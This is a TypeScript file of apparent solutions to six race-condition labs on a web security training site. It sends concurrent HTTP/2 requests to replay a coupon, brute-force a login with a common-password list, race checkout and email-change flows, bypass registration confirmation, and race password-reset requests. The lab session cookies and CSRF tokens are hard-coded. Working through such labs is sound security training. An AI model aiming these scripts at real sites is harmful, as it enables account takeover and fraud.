import http2, { ClientHttp2Session } from "http2";

// function lab1 () {
//   const client1 = http2.connect(
//     "https://0aeb00a00410a86b81408080007800c2.web-security-academy.net",
//   );
//   const client2 = http2.connect(
//     "https://0aeb00a00410a86b81408080007800c2.web-security-academy.net",
//   );
//   const sp = new URLSearchParams();
//   sp.append("csrf", "eR7LzJBiKxvQVa8HadtAQcjUw6iYeWtN");
//   sp.append("coupon", "PROMO20");
//   const body = sp.toString();
//   const contentLength = Buffer.byteLength(body);

//   function applyCoupon(client: ClientHttp2Session, idx: number) {
//     const request = client.request({
//       ":method": "POST",
//       ":path": "/cart/coupon",
//       "Content-Type": "application/x-www-form-urlencoded",
//       Cookie: "session=D3JPEkSb1gMHkQY9BjgzZZCqZm5kxXN0",
//       "Content-Length": contentLength,
//     });
//     request.end(body);
//     // const chunks: any[] = []
//     request.on("response", (headers) => {
//       const isSuccess =
//         headers.location === "/cart" && headers[":status"] === 302;
//       console.log({ isSuccess, client: idx % 2 === 0 ? "client1" : "client2" });
//     });
//     // request.on('data', (chunk) => chunks.push(chunk))
//     // request.on('end', () => console.log(Buffer.concat(chunks).toString('utf8')))
//   }
//   Array(40)
//     .fill(0)
//     .map((_, idx) =>
//       idx % 2 === 0 ? applyCoupon(client1, idx) : applyCoupon(client2, idx),
//     );
// }

// lab1()

// function lab2 () {
//   const passwords = `123123
// abc123
// football
// monkey
// letmein
// shadow
// master
// 666666
// qwertyuiop
// 123321
// mustang
// 123456
// password
// 12345678
// qwerty
// 123456789
// 12345
// 1234
// 111111
// 1234567
// dragon
// 1234567890
// michael
// x654321
// superman
// 1qaz2wsx
// baseball
// 7777777
// 121212
// 000000`.split('\n');
//   const clientHttp2Session = http2.connect('https://0a150020039eb5c480f16289008700c0.web-security-academy.net')
//   for (const password of passwords) {
//     const stream = clientHttp2Session.request({
//       "content-type": "application/x-www-form-urlencoded",
//       ":path": "/login",
//       ":method": "POST",
//       "cookie": "session=on0zOCAuNADvlSMo1j52etH30UIKqVx2"
//     })
//     stream.end(`csrf=LIsY5AzRWv4fJXFtqa0kbkxm6tEok6OY&username=carlos&password=${password}`)
//     stream.on('response', (headers) => {
//       console.log(headers[":status"])
//       if (headers[":status"] === 302) console.log(password)
//     })
//   }
//   console.log('ok')
// }

// lab2()

// function lab3() {
//   const cookie = "session=5ZWx7xl6NJB2OcEUV7ZhFzjhez0vqYM8";
//   const clientHttp2Session = http2.connect(
//     "https://0a3800f503887485807b0dc400a100a0.web-security-academy.net",
//   );

//   const checkoutStream = clientHttp2Session.request({
//     "content-type": "application/x-www-form-urlencoded",
//     ":path": "/cart/checkout",
//     ":method": "POST",
//     cookie: cookie,
//   });
//   checkoutStream.end("csrf=RdBIuGJJsR6fKUzTjis1nr4zhLS7T3Yv");

//   const addToCartStream = clientHttp2Session.request({
//     "content-type": "application/x-www-form-urlencoded",
//     ":path": "/cart",
//     ":method": "POST",
//     cookie: cookie,
//   });
//   addToCartStream.end("productId=1&redir=PRODUCT&quantity=1");
// }

// lab3();

// function lab4 () {
//   const csrf = "rdV8DUvAyBOEC5gnrE470rkROZjTRPD9";
//   const cookie = "session=R3bD21aRw8Dfd1iUqvAvxNczouBnwjYT";
//   const origin = "https://0aab0039043c69e382b3a6e500af0096.web-security-academy.net";
//   const clientHttp2Session = http2.connect(origin);
//   const changeEmailStream1 = clientHttp2Session.request({
//     "content-type": "application/x-www-form-urlencoded",
//     ":path": "/my-account/change-email",
//     ":method": "POST",
//     cookie: cookie,
//   })
//   changeEmailStream1.end(`email=helloworld%40exploit-0a42005e0414696f82d1a54001d4003c.exploit-server.net&csrf=${csrf}`)
//   const changeEmailStream2 = clientHttp2Session.request({
//     "content-type": "application/x-www-form-urlencoded",
//     ":path": "/my-account/change-email",
//     ":method": "POST",
//     cookie: cookie,
//   })
//   changeEmailStream2.end(`email=carlos%40ginandjuice.shop&csrf=${csrf}`)
// }

// lab4()

// async function lab5() {
//   const csrf = "XuF72hUyhKsfvY73MDBEz8pIEC0ESvuf";
//   const cookie = "phpsessionid=lk3WAHziPRfMb4H5Rg1iSOZirRQWzBX1";
//   const origin = "https://0ad600f403a44380bce3cf8a004d0013.web-security-academy.net";
//   const username = 'User3';
//   const password = 'User3';
//   const registerStreamChunks: Buffer[] = []
//   const clientHttp2Session = http2.connect(origin);
//   let registerStreamOk = false
//   let remoteSettingsOk = false

//   // 取得 remoteSettings
//   clientHttp2Session.request();
//   clientHttp2Session.on('remoteSettings', async () => {
//     remoteSettingsOk = true;
//     console.log(Date.now())
//     console.time('register-time-to-response');
//     confirmRequest();
//     const registerStream = clientHttp2Session.request({
//       "content-type": "application/x-www-form-urlencoded",
//       ":path": "/register",
//       ":method": "POST",
//       cookie: cookie,
//     });
//     registerStream.end(`csrf=${csrf}&username=${username}&email=${username}%40ginandjuice.shop&password=${password}`)
//     confirmRequest();
//     registerStream.on('response', () => {
//       registerStreamOk = true;
//       console.timeEnd('register-time-to-response');
//       console.log(Date.now())
//     })
//     registerStream.on('data', (chunk) => registerStreamChunks.push(chunk))
//     registerStream.on('end', () => {
//       const body = Buffer.concat(registerStreamChunks).toString('utf-8')
//       const status = body.includes('Please check your emails for your account registration link')
//       console.log('registerStream response registration status', status)
//     })
//     while (registerStreamOk === false) {
//       console.log('128 requests', Date.now());
//       await Promise.all(Array(128).fill(0).map(() => confirmRequest()));
//       await sleep(1)
//     }
//   })

//   // 驗證
//   function confirmRequest() {
//     return new Promise<true>((resolve) => {
//       const chunks: Buffer[] = []
//       const confirmStream = clientHttp2Session.request({
//         "content-type": "application/x-www-form-urlencoded",
//         "content-length": 0,
//         ":path": "/confirm?token[]=",
//         ":method": "POST",
//         cookie: cookie,
//       })
//       confirmStream.end(() => resolve(true))
//       confirmStream.on('response', (headers) => {
//         resolve(true)
//         if (headers[':status'] !== 400) {
//           console.log(headers, 'confirmStream response success!');
//         }
//       })
//       confirmStream.on('data', (chunk) => chunks.push(chunk))
//       confirmStream.on('end', () => {
//         const body = Buffer.concat(chunks).toString('utf-8');
//         if (body !== `"Incorrect token: Array"` && body.length !== 0) console.log({body});
//       })
//     })
//   }
//   console.log('end')
// }

// function sleep(ms: number) {
//   return new Promise((resolve) => setTimeout(() => resolve(true), ms))
// }

// lab5()

function lab6() {
  const origin =
    "https://0a4400c003eddf588011a3b100a100ce.web-security-academy.net";
  const clientHttp2Session = http2.connect(origin);
  const stream1 = clientHttp2Session.request({
    "content-type": "application/x-www-form-urlencoded",
    cookie: "phpsessionid=XXz2mTTeYzwdmF5cyrJGrHDZqPGsAq0q",
    ":method": "POST",
    ":path": "/forgot-password",
  });
  const stream2 = clientHttp2Session.request({
    "content-type": "application/x-www-form-urlencoded",
    cookie: "phpsessionid=J8v2LeLg0CVHupVhkdHf0B3JTfNPFH9Z",
    ":method": "POST",
    ":path": "/forgot-password",
  });
  stream1.end(`csrf=rXZSrY5pjhXhGcBW8Mlq5qTsS6d8gcYF&username=wiener`);
  stream2.end(`csrf=zliJ2MkhBQAjP100EcPQEP9l7IYRcpwK&username=carlos`);
}

lab6();
